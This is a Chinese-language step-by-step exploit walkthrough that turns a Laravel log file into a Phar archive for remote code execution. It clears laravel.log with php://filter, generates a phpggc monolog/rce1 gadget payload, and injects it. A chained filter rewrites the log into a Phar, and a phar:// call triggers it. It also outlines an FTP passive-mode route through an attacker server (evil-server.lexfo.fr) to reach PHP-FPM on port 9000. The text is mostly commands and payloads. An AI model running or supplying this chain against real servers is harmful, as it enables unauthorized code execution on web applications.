### 将日志文件转换为 Phar 文件

要将日志文件转换为Phar文件，必须确保文件以 `__HALT_COMPILER();?>` 结尾。否则，Phar扩展将无法识别该文件。以下步骤和方法可以帮助你实现这一目标。

#### 转换Log文件为Phar文件的方法

1. **使用 `php://filter` 修改文件内容**：
   在读取包含敏感信息的PHP源文件时，为了规避特殊字符导致的问题，可以先对可能引起冲突的代码进行编码，例如使用Base64编码：
   ```php
   php://filter/read=convert.base64-encode/resource=xxx.php
   ```
   PHP在解码Base64时会忽略不符合标准的字符，只对合法字符进行解码。这个特性常用于绕过某些限制。

2. **处理大量文本数据**：
   如果日志文件中包含大量堆栈跟踪信息和其他无关内容，直接转换可能会遇到问题。因此，建议在注入payload之前彻底清空日志文件，使文件内容完全由payload构成。

3. **清空日志文件**：
   使用以下过滤器来清空日志文件：
   ```php
   php://filter/read=consumed/resource=../storage/logs/laravel.log
   ```

4. **处理单个错误记录**：
   单独使用Base64解码不能清除所有非有效字符。通过结合多个过滤器，如 `convert.iconv.utf16le.utf-8` 和 `convert.base64-decode`，可以更有效地处理这些内容。

5. **构造Payload**：
   - 首先，确保日志文件中的记录是两字节对齐的。
   - 然后，使用 `quoted-printable` 编码处理空字节和其他特殊字符。
   - 最后，通过以下过滤链将日志文件转换为Phar文件：
     ```php
     php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
     ```

#### 具体步骤

1. **编码构造Payload**：
   - 生成Base64编码的Payload，并将其转换为quoted-printable编码。
   - 保存结果到 `payload.txt` 中，并在末尾添加一个字符（如 `a`）以确保只有一个完整的Payload。
   ```bash
   php -d 'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt
   ```

2. **清空日志文件**：
   ```php
   php://filter/read=consumed/resource=../storage/logs/laravel.log
   ```

3. **发送无害Payload**：
   发送一个无害的Payload以确保日志文件中的记录是两字节对齐的。
   ```bash
   AA
   ```

4. **发送攻击Payload**：
   将构造好的Payload发送到服务器。
   ```bash
   =50=00=44=00=39=00=77=00=61=00=48=00=41...=00=43=00=54=00=55=00=49=00=3D=00a
   ```

5. **转换文件**：
   使用过滤链将日志文件转换为Phar文件。
   ```php
   php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
   ```

6. **利用Phar伪协议**：
   使用Phar伪协议执行Payload。
   ```php
   phar://../storage/logs/laravel.log/test.txt
   ```

#### 漏洞拓展

另一种思路是通过FTP与PHP-FPM对话。具体方法如下：

1. **发现PHP-FPM监听端口**：
   通过扫描通用端口，发现PHP-FPM在监听端口9000。

2. **使用FTP被动模式**：
   使用FTP被动模式让 `file_get_contents()` 在服务器上下载文件，并在上传时将文件发送到 `127.0.0.1:9000`。
   ```php
   ftp://evil-server.lexfo.fr/file.txt
   ```

这样就可以发送任意二进制数据包，从而实现远程代码执行（RCE）。

### 总结

本文详细介绍了如何将日志文件转换为Phar文件，并利用多种过滤器和编码技术解决相关问题。同时，还探讨了通过FTP与PHP-FPM对话的另一种漏洞利用方法。希望这些内容能帮助你更好地理解和应用这些技术。